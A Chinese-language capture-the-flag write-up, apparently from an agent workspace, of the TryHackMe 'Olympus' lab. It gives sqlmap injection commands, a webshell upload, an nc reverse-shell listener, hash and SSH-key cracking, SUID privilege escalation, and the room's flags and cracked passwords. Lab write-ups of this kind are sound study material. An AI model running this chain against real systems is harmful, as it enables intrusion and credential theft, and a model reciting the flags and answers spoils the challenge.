# THM Olympus 渗透测试完整 Writeup (2026-05-29)

**目标**: 10.49.149.192 - TryHackMe 靶场 (Olympus)
**授权**: THM 授权靶场，全 IP 范围，无限制
**测试日期**: 2026-05-29
**总耗时**: ~120 分钟

---

## 1. 信息搜集

### 1.1 Nmap 端口扫描

```bash
nmap -sV -sC -T4 10.49.149.192 -oX /home/yao/.openclaw/workspace/pentest/runs/10.49.149.192/nmap/quick-scan.xml
```

**扫描结果**:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

### 1.2 添加 Hosts 解析

```bash
echo "10.49.149.192 olympus.thm" | sudo tee -a /etc/hosts
echo "10.49.149.192 chat.olympus.thm" | sudo tee -a /etc/hosts
```

### 1.3 Web 枚举 (gobuster)

```bash
gobuster dir -k -u http://olympus.thm/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip -t 50
```

**关键发现**:
- `/index.php` - 主页面 (Olympus v2)
- `/~webmaster/` - 用户家目录 (Victor CMS) (301)
- `/phpmyadmin` - phpMyAdmin (403)
- `/static/` - 静态文件目录
- `/javascript/` - JS 目录

---

## 2. Web 应用分析

### 2.1 ~webmaster 目录 (Victor CMS)

访问 `http://olympus.thm/~webmaster/`:
- **CMS**: Victor CMS (Simple Content Management System)
- **作者**: Victor Alagwu
- **关键路径**:
  - `search.php` - 搜索功能
  - `register.php` - 注册页面
  - `post.php?post=3` - **Credentials** 文章 (关键！)
  - `category.php` - 分类页面

### 2.2 Chat 子域

访问 `http://chat.olympus.thm/`:
- **302 重定向** → `login.php`
- **功能**: 登录、聊天、文件上传
- **表单字段**: `username`, `password`

---

## 3. 漏洞利用

### 3.1 SQL 注入

**位置**: `http://olympus.thm/~webmaster/search.php` (POST 参数)

**Payload**:
```
search=test' OR 1=1
```

**错误信息**:
```
Query Fail
You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version
for the right syntax to use near '%' AND post_status='publish'' at line 1
```

**sqlmap 扫描**:
```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" \
  --method POST --data="search=test&submit=" \
  -p search --threads=10 --level=3 --risk=2 \
  --technique=BEU --batch --random-agent
```

**sqlmap 结果**:
- **注入类型**: boolean-based blind + error-based + UNION query
- **数据库**: MySQL >= 5.6
- **列数**: 10 columns

**读取数据库**:
```bash
# 获取数据库列表
sqlmap -u "http://olympus.thm/~webmaster/search.php" \
  --method POST --data="search=test&submit=" \
  -p search --batch --dbs

# 读取 olympus 数据库所有表
sqlmap -u "http://olympus.thm/~webmaster/search.php" \
  --method POST --data="search=test&submit=" \
  -p search --batch -D olympus --dump
```

**数据库内容**:

**users 表**:
| user_id | username   | user_password   | user_role |
| ------- | ---------- | --------------- | --------- |
| 3       | prometheus | $2y$10$YC6uo... | User      |
| 6       | root       | $2y$10$lcs4X... | Admin     |
| 7       | zeus       | $2y$10$cpJKD... | User      |

**flag 表**:
| flag                      |
| ------------------------- |
| flag{Sm4rt!_k33P_d1gGIng} |

**chats 表** (关键发现):
| dt         | msg                                | uname      | file                                 |
| ---------- | ---------------------------------- | ---------- | ------------------------------------ |
| 2022-04-05 | Attached : prometheus_password.txt | prometheus | 47c3210d51761686f3af40a875eeaaea.txt |

---

## 4. 密码破解

### 4.1 保存 hash

```bash
cat > olympus_hashes.txt << 'EOF'
prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
EOF
```

### 4.2 John 破解

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt olympus_hashes.txt
```

**破解结果**:
- **prometheus**: `summertime`

---

## 5. 初始访问

### 5.1 登录 Chat 系统

```bash
curl -X POST 'http://chat.olympus.thm/login.php' \
  -d 'username=prometheus&password=summertime' \
  -c chat_cookies.txt
```

### 5.2 文件上传 webshell

通过聊天系统上传 PHP webshell (`.phtml` 绕过):

```bash
curl -X POST 'http://chat.olympus.thm/home.php' \
  -b chat_cookies.txt \
  -F 'msg=test' \
  -F 'fileToUpload=@webshell.phtml' \
  -F 'submit=send'
```

**获取上传文件名** (SQL 注入查询 chats 表):
```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" \
  --method POST --data="search=test&submit=" \
  -p search --batch -D olympus -T chats --dump
```

**最新上传文件**:
- `261008b94e36eb6ee372853d0ef63207.phtml`
- `1049e6364dad3112c32eaf35f683a94f.phtml`

### 5.3 获取 webshell

访问 webshell 并反弹 shell:
```
http://chat.olympus.thm/uploads/261008b94e36eb6ee372853d0ef63207.phtml
```

本地监听:
```bash
nc -lvnp 1234
```

**获取**: www-data shell

---

## 6. 权限提升

### 6.1 www-data → zeus

#### 6.1.1 发现 SUID cputils

```bash
find / -perm -4000 2>/dev/null
```

**发现**:
- `/usr/bin/cputils` - 自定义文件复制工具 (SUID)

#### 6.1.2 利用 cputils 复制 zeus SSH 私钥

```bash
# 在 www-data shell 中
/usr/bin/cputils
# Source: /home/zeus/.ssh/id_rsa
# Target: /tmp/id_rsa
```

#### 6.1.3 破解 SSH key passphrase

```bash
ssh2john /tmp/id_rsa > zeus_key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zeus_key.hash
```

**破解结果**:
- **passphrase**: `snowflake`

#### 6.1.4 SSH 登录 zeus

```bash
chmod 600 /tmp/id_rsa
ssh -i /tmp/id_rsa zeus@10.49.149.192
# Enter passphrase: snowflake
```

### 6.2 zeus → root

#### 6.2.1 发现后门文件

在 zeus shell 中检查 `/var/www/html/`:
```bash
cd /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/
cat VIGQFQFMYOST.php
```

**后门分析**:
- 密码: `a7c5ffcf139742f52a5267c4a0674129`
- 执行命令: `/lib/defended/libc.so.99`

#### 6.2.2 执行 SUID 提权

```bash
ls -la /lib/defended/libc.so.99
# -rwsr-xr-x 1 root root 16784

/lib/defended/libc.so.99
# 获取 ROOT
```

---

## 7. 获取的 Flags

| Flag              | 位置                         | 内容                                |
| ----------------- | ---------------------------- | ----------------------------------- |
| **SQL 注入 Flag** | olympus.flag 表              | `flag{Sm4rt!_k33P_d1gGIng}`         |
| **User Flag**     | /home/zeus/user.flag         | `flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}` |
| **Root Flag**     | /root/root.flag              | `flag{D4mN!_Y0u_G0T_m3_:)_}`        |
| **隐藏 Flag**     | /etc/ssl/private/.b0nus.fl4g | `flag{Y0u_G0t_m3_g00d!}`            |

---

## 8. 完整攻击路径

```
信息搜集
    ↓
Nmap 扫描 (22/80)
    ↓
添加 hosts (olympus.thm / chat.olympus.thm)
    ↓
Web 枚举 (gobuster)
    ↓
发现 /~webmaster/ (Victor CMS)
    ↓
SQL 注入 (search.php)
    ↓
读取数据库 → 获取密码 hash + flag 表
    ↓
John 破解 → prometheus:summertime
    ↓
登录 Chat 系统 (chat.olympus.thm)
    ↓
文件上传 webshell (.phtml)
    ↓
获取 www-data shell
    ↓
发现 SUID cputils
    ↓
复制 zeus SSH 私钥 (/home/zeus/.ssh/id_rsa)
    ↓
John 破解 passphrase → snowflake
    ↓
SSH 登录 zeus
    ↓
发现 /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php (后门)
    ↓
执行 /lib/defended/libc.so.99 (SUID root)
    ↓
ROOT
    ↓
获取 Flags
    ↓
/etc/ssl/private/.b0nus.fl4g → 隐藏 flag
```

---

## 9. 关键技术点

### 9.1 SQL 注入
- **类型**: MySQL error-based + boolean-based blind + UNION query
- **位置**: `search.php` POST 参数
- **利用**: sqlmap 读取完整数据库

### 9.2 密码破解
- **工具**: john
- **类型**: bcrypt hash + SSH key passphrase
- **结果**: prometheus:summertime, zeus key:snowflake

### 9.3 文件上传
- **绕过**: `.phtml` 扩展名
- **利用**: 上传 PHP 反向 shell
- **获取文件名**: SQL 注入查询 chats 表

### 9.4 SUID 提权
- **cputils**: 自定义文件复制工具，复制 zeus SSH 私钥
- **libc.so.99**: SUID root 后门，直接获取 root

### 9.5 隐藏文件查找
- **方法**: `sudo find / -type f -exec grep -l 'flag{.*}' {} \; 2>/dev/null`
- **发现**: `/etc/ssl/private/.b0nus.fl4g`
